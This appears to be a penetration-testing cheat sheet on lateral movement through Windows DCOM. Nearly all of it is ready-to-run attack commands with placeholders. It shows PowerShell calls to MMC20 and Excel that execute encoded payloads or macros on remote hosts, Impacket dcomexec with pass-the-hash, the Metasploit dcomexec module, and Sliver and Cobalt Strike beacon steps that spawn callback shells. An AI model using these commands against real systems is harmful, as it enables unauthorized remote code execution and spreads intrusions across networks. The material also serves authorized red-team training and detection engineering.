# Distributed Component Object Model (DCOM)

## 01 - Powershell

### 1.1 - MMC20.Application

```powershell
C:\> powershell -exec bypass -command "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '<IP>')).Document.ActiveView.ExecuteShellCommand('C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe', $null, '-E <base64_payload>', '7')"

PS C:\> [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '<IP>')).Document.ActiveView.ExecuteShellCommand('C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe', $null, '-E <base64_payload>', '7')
```

### 1.2 - Excel.Application

```powershell
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))
$com | Get-Member
```

`$ cat macro.vba`

---

```vbscript
Sub mymacro()
    'payload goes here
    Shell ("notepad.exe")
End Sub
```

`$ cat copyexceldcom.ps1`

---

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))

$LocalPath = "path\to\excelmacrofile.xls"

$RemotePath = "\\<IP>\C$\excelmacrofile.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

`$ cat openexceldcom.ps1`

---

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))

$LocalPath = "C:\path\to\excelmacrofile.xls"

$RemotePath = "\\<IP>\C$\excelmacrofile.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

# When running as system adminstrator privileges
$Path = "\\<IP>\C$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [System.IO.Directory]::CreateDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\excelmacrofile.xls")

$com.Run("mymacro")
```

## 02 - Impacket

`$ dcomexec.py <username>:<password>@<IP> [-codecs <codec>]`

- Pass the Hash

`$ dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT> <username>@<IP>`

## 03 - Metasploit

```
msf > use auxiliary/scanner/smb/impacket/dcomexec

msf auxiliary(scanner/smb/impacket/dcomexec) > options

Module options (auxiliary/scanner/smb/impacket/dcomexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     yes       The command to execute
   OBJECT     MMC20            yes       The DCOM object to use for execution (Accepted: ShellWindows, ShellBrowserWindow, MMC20)
   OUTPUT     true             yes       Get the output of the executed command
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     yes       The password for the specified username
   SMBUser                     yes       The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf auxiliary(scanner/smb/impacket/dcomexec) > set command <commands>

msf auxiliary(scanner/smb/impacket/dcomexec) > set object <MMC20 | ShellBrowserWindow | ShellWindows>

msf auxiliary(scanner/smb/impacket/dcomexec) > set output true

msf auxiliary(scanner/smb/impacket/dcomexec) > set rhosts <target_IP>

msf auxiliary(scanner/smb/impacket/dcomexec) > set smbuser <username>

msf auxiliary(scanner/smb/impacket/dcomexec) > set smbpass <password>

msf auxiliary(scanner/smb/impacket/dcomexec) > set smbdomain <domain_name>

msf auxiliary(scanner/smb/impacket/dcomexec) > set threads 2

msf auxiliary(scanner/smb/impacket/dcomexec) > run
```

## 04 - Sliver

### 4.1 - Spawn Callback Shell

TODO: Show a step by step approach using SharpCOM via `execute-assembly` (see references)

```
sliver (IMPLANT_NAME) > execute-assembly /path/to/SharpCOM.exe --Method <ShellWindows | MMC | ShellBrowserWindow | ExcelDDE> --ComputerName <target_IP> --Command "C:\path\to\shell.exe"
```

## 05 - Cobalt Strike

### 5.1 - Spawn Callback Shell

TODO: Show a step by step approach using SharpCOM via execute-assembly (see references)

#### 5.1.1 - Invoke-DCOM

```
beacon> powershell-import Invoke-DCOM.ps1

beacon> <powershell | powerpick> Invoke-DCOM -ComputerName <IP> -Method <MMC20.Application | ShellWindows | ShellBrowserWindow | ExcelDDE> -Command C:\path\to\shell.exe

beacon> link <IP>
```

```
beacon> <powershell | powerpick> Invoke-DCOM -ComputerName <IP> -Method <ServiceCheck | MinimizeAll | ServiceStop | ServiceStart> "<service_name>"
```

#### 5.1.2 - SharpCOM

```
beacon> execute-assembly /path/to/SharpCOM.exe --Method <ShellWindows | MMC | ShellBrowserWindow | ExcelDDE> --ComputerName <target_IP> --Command "C:\path\to\shell.exe"
```

---
## References

- [Invoke-DCOM](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/lateral_movement/Invoke-DCOM.ps1)

- [SharpCOM](https://github.com/rvrsh3ll/SharpCOM)

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)